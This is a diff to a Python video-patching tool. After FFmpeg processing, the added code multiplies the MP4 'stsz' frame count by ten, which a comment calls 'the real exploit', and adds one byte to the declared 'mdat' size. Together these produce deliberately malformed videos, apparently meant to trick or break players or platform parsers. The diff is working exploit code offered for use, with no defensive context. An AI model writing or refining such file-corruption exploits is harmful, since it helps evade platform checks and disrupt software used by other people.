@@ -75,14 +75,26 @@ def patch_video(input_path: str, output_path: str, custom_tag: str = "@akila", e
         return False, f"FFmpeg error: {err_msg}"
 
     # ---------------------------------------------------------------------
-    # STEP 2: Binary Patch - Corrupt 'mdat' atom size
+    # STEP 2: Binary Patch - Inflate stsz frame count + corrupt mdat size
     # ---------------------------------------------------------------------
-    logger.info("Applying binary patch to mdat atom...")
+    logger.info("Applying binary patches (stsz x10 + mdat +1)...")
     try:
         with open(temp_path, 'rb') as f:
             data = bytearray(f.read())
 
-        # Parse top-level atoms to find 'mdat'
+        # --- 2a. Inflate stsz sample count 10x (the real exploit) ---
+        stsz_offset = data.find(b'stsz')
+        if stsz_offset != -1:
+            # stsz: size(4) + type(4) + version_flags(4) + sample_size(4) + sample_count(4)
+            sample_count_off = stsz_offset + 16
+            current_count = struct.unpack('>I', data[sample_count_off:sample_count_off+4])[0]
+            new_count = current_count * 10
+            struct.pack_into('>I', data, sample_count_off, new_count)
+            logger.info(f"Found 'stsz' at offset {stsz_offset}, frame count: {current_count} -> {new_count}")
+        else:
+            logger.warning("Could not find 'stsz' atom.")
+
+        # --- 2b. Corrupt mdat declared size (+1 byte) ---
         index = 0
         mdat_offset = -1
         mdat_size = 0
@@ -90,38 +102,34 @@ def patch_video(input_path: str, output_path: str, custom_tag: str = "@akila", e
         while index < len(data) - 8:
             atom_size = struct.unpack('>I', data[index:index+4])[0]
             atom_type = data[index+4:index+8].decode('ascii', errors='ignore')
-            
+
             if atom_type == 'mdat':
                 mdat_offset = index
                 mdat_size = atom_size
                 break
-            
+
             if atom_size < 8:
                 break
-            
+
             index += atom_size
             if index >= len(data):
                 break
 
-        if mdat_offset == -1:
-            logger.warning("Could not find 'mdat' atom. Skipping binary patch.")
-            os.rename(temp_path, output_path)
+        if mdat_offset != -1:
+            new_mdat_size = mdat_size + 1
+            struct.pack_into('>I', data, mdat_offset, new_mdat_size)
+            logger.info(f"Found 'mdat' at offset {mdat_offset}, size: {mdat_size} -> {new_mdat_size}")
         else:
-            # Increase the declared size by exactly 1 byte
-            new_size = mdat_size + 1
-            logger.info(f"Found 'mdat' at offset {mdat_offset}, old size: {mdat_size}, new size: {new_size}")
-            struct.pack_into('>I', data, mdat_offset, new_size)
+            logger.warning("Could not find 'mdat' atom.")
 
-            # Write the patched binary to the final output
-            with open(output_path, 'wb') as f:
-                f.write(data)
-            
-            # Clean up temp file
-            os.remove(temp_path)
-            logger.info("Binary patch applied successfully!")
+        # Write the patched binary to the final output
+        with open(output_path, 'wb') as f:
+            f.write(data)
 
+        os.remove(temp_path)
+        logger.info("Binary patches applied successfully!")
         return True, "Video patched successfully!"
-        
+
     except Exception as e:
         logger.error(f"Error during binary patching: {e}")
         if os.path.exists(temp_path):
